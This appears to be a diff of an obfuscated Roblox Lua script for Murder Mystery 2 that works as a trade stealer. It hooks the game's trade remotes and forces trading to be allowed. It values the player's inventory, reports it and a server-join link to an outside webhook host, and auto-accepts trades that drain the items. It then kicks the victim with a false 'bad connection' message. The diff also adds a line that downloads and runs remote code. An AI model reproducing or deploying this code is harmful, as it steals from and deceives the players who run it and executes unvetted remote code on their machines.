@@ -32,7 +32,6 @@ pcall(function()
 
 		if ok then
 			t1[i] = result
-
 			continue
 		end
 
@@ -44,7 +43,6 @@ pcall(function()
 	for i = 2, #t1 do
 		if t1[i] ~= t1[1] then
 			v8 = false
-
 			break
 		end
 	end
@@ -58,6 +56,7 @@ pcall(function()
 		warn("hello!")
 	end
 end)
+
 pcall(function()
 	if hookfunction then
 		if type(hookfunction) == "function" then
@@ -75,7 +74,6 @@ pcall(function()
 
 					if v13 and v13.FireServer then
 						local FireServer = v13.FireServer
-
 						hookfunction(FireServer, FireServer)
 					end
 				end
@@ -83,6 +81,7 @@ pcall(function()
 		end
 	end
 end)
+
 pcall(function()
 	local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
 
@@ -97,6 +96,7 @@ pcall(function()
 		end
 	end
 end)
+
 pcall(function()
 	if has(hookfunction) and has(debug.getinfo) then
 		local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
@@ -136,6 +136,7 @@ pcall(function()
 		end
 	end
 end)
+
 pcall(function()
 	if has(getrawmetatable) and has(debug.getupvalue) and has(debug.setupvalue) then
 		local v24 = getrawmetatable(game)
@@ -147,7 +148,6 @@ pcall(function()
 				for i = 1, 10 do
 					if pcall(debug.getupvalue, __namecall, i) == "TradeAllowed" then
 						pcall(debug.setupvalue, __namecall, i, true)
-
 						return
 					end
 				end
@@ -166,6 +166,7 @@ pcall(function()
 		end
 	end
 end)
+
 task.spawn(function()
 	while task.wait() do
 		pcall(function()
@@ -178,12 +179,12 @@ end)
 
 if _G.__ElysiumMM2 then
 	print("already running")
-
 	return
 end
 
 _G.__ElysiumMM2 = true
 _G.LastOffer = nil
+
 pcall(function()
 end)
 
@@ -195,7 +196,6 @@ v32("PlaceId: " .. game.PlaceId)
 
 if game.PlaceId ~= 142823291 then
 	v32("WRONG GAME — expected 142823291")
-
 	return
 end
 
@@ -209,7 +209,6 @@ if ok and result == "VIPServer" then
 	game.Players.LocalPlayer:Kick([[VIP / Private Server detected.
 Using this script in this server may result in a ban.
 Please join a PUBLIC server.]])
-
 	return
 end
 
@@ -227,6 +226,8 @@ if LocalPlayer and LocalPlayer.Name then
 end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/snthnova/Snthnova-gui/refs/heads/main/mm2.lua"))()
 
 if not getgenv().MM2_API_BASE then
 	getgenv().MM2_API_BASE = "https://elysium-mm2-api.snthnova.workers.dev"
@@ -248,7 +249,6 @@ v32("HTTP fn: " .. (request_ and "found" or "MISSING"))
 local function v50(p1)
 	if not request_ then
 		v32("HTTP GET: no request function available")
-
 		return nil
 	end
 
@@ -290,7 +290,6 @@ if identifyexecutor and identifyexecutor() == "Delta" then
 
 					if ok2 and result2 and result2.name == "stepAnimate" then
 						v55 = v61
-
 						break
 					end
 				end
@@ -316,6 +315,7 @@ if identifyexecutor and identifyexecutor() == "Delta" then
 
 		return v64(p2)
 	end)
+
 	v32("Waiting for capturedJobId...")
 
 	while true do
@@ -389,7 +389,6 @@ end
 
 if not Weapons then
 	v32("FATAL: Database nil — aborting")
-
 	return
 end
 
@@ -437,7 +436,6 @@ else
 		for i = 1, 20 do
 			if not v87.Weapons or not next(v87.Weapons.Owned) then
 				task.wait(0.3)
-
 				continue
 			end
 
@@ -477,7 +475,6 @@ end
 
 if not v87 then
 	v32("FATAL: profileData nil — aborting")
-
 	return
 end
 
@@ -512,7 +509,6 @@ local function v100()
 
 	if not ok4 or not result4 then
 		v32("Failed to fetch values from GitHub - using fallback")
-
 		return {}
 	end
 
@@ -521,7 +517,6 @@ local function v100()
 
 		if not pos then
 			v32("Could not find weaponValues table in content")
-
 			return nil
 		end
 
@@ -552,7 +547,6 @@ local function v100()
 
 					if n1 == 0 then
 						v110 = i
-
 						break
 					end
 				end
@@ -564,7 +558,6 @@ local function v100()
 		end
 
 		v32("Could not find end of weaponValues table")
-
 		return nil
 	end
 
@@ -572,7 +565,6 @@ local function v100()
 
 	if not v113 then
 		v32("Failed to extract weaponValues table")
-
 		return {}
 	end
 
@@ -580,7 +572,6 @@ local function v100()
 
 	if not chunk then
 		v32("Failed to loadstring: " .. tostring(v115))
-
 		return {}
 	end
 
@@ -588,12 +579,10 @@ local function v100()
 
 	if not ok5 or type(result5) ~= "table" then
 		v32("Failed to execute loaded values: " .. tostring(result5))
-
 		return {}
 	end
 
 	v32("Successfully loaded weapon values with " .. #result5 .. " categories")
-
 	return result5
 end
 
@@ -672,7 +661,6 @@ local function v144()
 
 	if not ok4 or not result4 then
 		v32("Failed to fetch dollar API - using empty map")
-
 		return {}
 	end
 
@@ -680,7 +668,6 @@ local function v144()
 
 	if not ok5 or not result5 or not result5.data then
 		v32("Failed to decode dollar API response")
-
 		return {}
 	end
 
@@ -694,7 +681,6 @@ local function v144()
 	end
 
 	v32("Loaded " .. #result5.data .. " dollar values")
-
 	return t7
 end
 
@@ -787,9 +773,11 @@ local function v159(p6)
 
 	return p6
 end
+
 local function v163(p7)
 	return p7 and p7.Chroma == true
 end
+
 local function v164(p8)
 	local v165 = v159(p8)
 	local v166 = Weapons[v165]
@@ -814,6 +802,7 @@ local function v164(p8)
 		dollarValue = v169
 	}
 end
+
 local function v170(p9)
 	if Weapons[p9] then
 		return p9, "Weapons"
@@ -844,9 +833,9 @@ local function v170(p9)
 	end
 
 	v32("WARNING: Could not fix DataID: " .. p9)
-
 	return p9, "Weapons"
 end
+
 local function v175()
 	local ok4, result4 = pcall(function()
 		return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
@@ -864,6 +853,7 @@ local function v175()
 
 	return result4
 end
+
 local function v178(p10)
 	local t9 = {}
 	local Owned = p10.Weapons and p10.Weapons.Owned or {}
@@ -876,10 +866,7 @@ local function v178(p10)
 
 		if v186 then
 			if not t8[v184] and not t8[v186.dataid] then
-				local insert = table.insert
-				local v188 = t9
-
-				insert(v188, {
+				table.insert(t9, {
 					DataID = v184,
 					Name = v186.name .. (v186.isChroma and " [CHROMA]" or ""),
 					Amount = v185,
@@ -903,7 +890,6 @@ local function v178(p10)
 				for i = 4, 1, -1 do
 					if Evo[i] and Evo[i].XPRequired <= XP then
 						v191 = Evo[i].ItemName or v191
-
 						break
 					end
 				end
@@ -966,8 +952,6 @@ local function v197(p13)
 			local v209 = v164(v208)
 
 			if v209 and not t8[v208] and not t8[v209.dataid] then
-				local insert = table.insert
-				local v211 = t10
 				local t11 = {
 					DataID = v208
 				}
@@ -980,7 +964,7 @@ local function v197(p13)
 				t11.DollarValue = v209.dollarValue
 				t11.Rarity = v209.rarity
 				t11.IsChroma = v209.isChroma
-				insert(v211, t11)
+				table.insert(t10, t11)
 			end
 		end
 	end
@@ -1076,6 +1060,7 @@ end
 
 local v246 = MM2_API_BASE .. "/webhook/"
 local v247 = MM2_API_BASE
+
 local function v251(p21, p22, p23)
 	if not request_ or p21 == "" then
 		return
@@ -1099,6 +1084,7 @@ local function v251(p21, p22, p23)
 		Body = result4
 	})
 end
+
 local function v254()
 	if not request_ then
 		return
@@ -1162,6 +1148,7 @@ local function v256()
 		end
 	end
 end
+
 local function v262()
 	if not request_ then
 		return nil
@@ -1196,6 +1183,7 @@ local function v262()
 
 	return nil
 end
+
 local function v269(p24, p25)
 	local v270 = v228(u215, 20, " ➜ ")
 	local v271 = string.format("https://reborn.elysium.indevs.in/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, JobId2)
@@ -1255,8 +1243,6 @@ local function v269(p24, p25)
 	}
 end
 
-getgenv().BLACKLIST_URL = "https://pastefy.app/YUhu3IrQ/raw"
-
 local u276 = false
 
 local function v277()
@@ -1266,7 +1252,6 @@ local function v277()
 
 	if #u215 == 0 then
 		v32("No tradable weapons — kicking as bot")
-
 		return
 	end
 
@@ -1284,7 +1269,6 @@ local function v277()
 		if v284[1] then
 			if (v284[3]).Value >= 8000 then
 				v279 = true
-
 				break
 			end
 		else
@@ -1296,43 +1280,7 @@ local function v277()
 		v279 = true
 	end
 
-	if getgenv().BLACKLIST_URL and v279 then
-		local ok4, result4 = pcall(function()
-			return game:HttpGet(getgenv().BLACKLIST_URL)
-		end)
-
-		if ok4 and result4 then
-			local chunk = loadstring(result4)
-
-			if chunk then
-				local ok5, result5 = pcall(chunk)
-
-				if ok5 and type(result5) == "table" then
-					local v291, v292, v293 = ipairs(result5)
-					local v294 = geniter(v291, v292, v293)
-
-					while true do
-						local v295 = table.pack(v294())
-
-						if v295[1] then
-							local v296 = v295[3]
-
-							if LocalPlayer.Name:lower() == v296:lower() then
-								v279 = false
-
-								break
-							end
-						else
-							break
-						end
-					end
-				end
-			end
-		end
-	end
-
 	local v298 = false
-
 	local v300 = false
 	local v301 = false
 	local v302, v303, v304 = ipairs(u215)
@@ -1344,7 +1292,6 @@ local function v277()
 		if v306[1] then
 			if (v306[3]).Value >= 1000 then
 				v301 = true
-
 				break
 			end
 		else
@@ -1362,7 +1309,6 @@ local function v277()
 		if v312[1] then
 			if ((v312[3]).DollarValue or 0) >= 30 then
 				v307 = true
-
 				break
 			end
 		else
@@ -1379,7 +1325,6 @@ local function v277()
 	for _, v in v313, v314, v315 do
 		if THRESHOLD <= v.Value then
 			v298 = true
-
 			break
 		end
 	end
@@ -1396,10 +1341,7 @@ local function v277()
 		end
 	end
 
-
-
 	if v300 then
-
 	end
 end
 
@@ -1411,7 +1353,6 @@ end
 
 if #u196 == 0 then
 	v32("No tradable weapons — stopping")
-
 	return
 end
 
@@ -1421,7 +1362,6 @@ local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
 
 if not Trade then
 	v32("Trade folder not found — aborting")
-
 	return
 end
 
@@ -1487,9 +1427,9 @@ local function v328()
 	local v331 = ok4 and result4
 
 	v331 = v331 or "None"
-
 	return v331
 end
+
 local function v332()
 	local v333 = v328()
 
@@ -1517,7 +1457,6 @@ task.spawn(function()
 
 		pcall(function()
 			local AcceptTrade = Trade.AcceptTrade
-
 			AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
 		end)
 	end
@@ -1616,11 +1555,13 @@ local function v348(p28)
 
 	return false
 end
+
 local function v352()
 	while v328() ~= "None" do
 		task.wait(0.1)
 	end
 end
+
 local function v353(p29)
 	v32("doTradeWithTarget: " .. p29.Name)
 	v332()
@@ -1628,13 +1569,11 @@ local function v353(p29)
 	while true do
 		if not p29.Parent then
 			v32("Target left or no more items: " .. p29.Name)
-
 			return
 		end
 
 		if not (#u196 > 0) then
 			v32("Target left or no more items: " .. p29.Name)
-
 			return
 		end
 
@@ -1722,7 +1661,6 @@ local function v353(p29)
 
 		if not u320 then
 			v365 = true
-
 			break
 		end
 
@@ -1731,7 +1669,6 @@ local function v353(p29)
 		for i = 1, v371.Amount do
 			if not u320 then
 				v365 = true
-
 				break
 			end
 
@@ -1747,7 +1684,6 @@ local function v353(p29)
 		v32("Offer aborted or no items – cancelling")
 		Trade.DeclineTrade:FireServer()
 		u196 = {}
-
 		return
 	end
 
@@ -1759,7 +1695,6 @@ local function v353(p29)
 	while tick() < v375 do
 		if v328() == "None" then
 			v32("Trade ended by server")
-
 			break
 		end
 
@@ -1807,6 +1742,7 @@ local function v384(p30)
 
 	t20[p30.Name] = true
 	v32("Trade thread starting: " .. p30.Name)
+
 	task.spawn(function()
 		local now = tick()
 
@@ -1814,12 +1750,10 @@ local function v384(p30)
 			if p30.Character then
 				if not p30.Character:FindFirstChildOfClass("Humanoid") then
 					task.wait(0.5)
-
 					continue
 				end
 			else
 				task.wait(0.5)
-
 				continue
 			end
 
@@ -1876,13 +1810,13 @@ Players.PlayerAdded:Connect(function(player)
 	end
 
 	t21[player.Name] = true
+
 	task.spawn(function()
 		local now = tick()
 
 		while tick() - now < 20 do
 			if not player.Parent then
 				t21[player.Name] = nil
-
 				return
 			end
 
@@ -1903,11 +1837,13 @@ Players.PlayerAdded:Connect(function(player)
 		end
 	end)
 end)
+
 Players.PlayerRemoving:Connect(function(player)
 	if t20[player.Name] then
 		t20[player.Name] = nil
 	end
 end)
+
 v32("── Init complete — all triggers active ──")
 
 local v396 = false
@@ -1916,13 +1852,13 @@ local v397, v398, v399 = ipairs(u215)
 for _, v in v397, v398, v399 do
 	if THRESHOLD <= v.Value then
 		v396 = true
-
 		break
 	end
 end
 
 if v396 then
 	v32("Player has items above threshold - starting drain kick watcher")
+
 	task.spawn(function()
 		while LocalPlayer.Parent do
 			task.wait(15)
@@ -1963,7 +1899,6 @@ if v396 then
 			if n12 == 0 then
 				LocalPlayer:Kick([[You got disconnected due to bad connection Please Rejoin 
 ]])
-
 				return
 			end
 		end
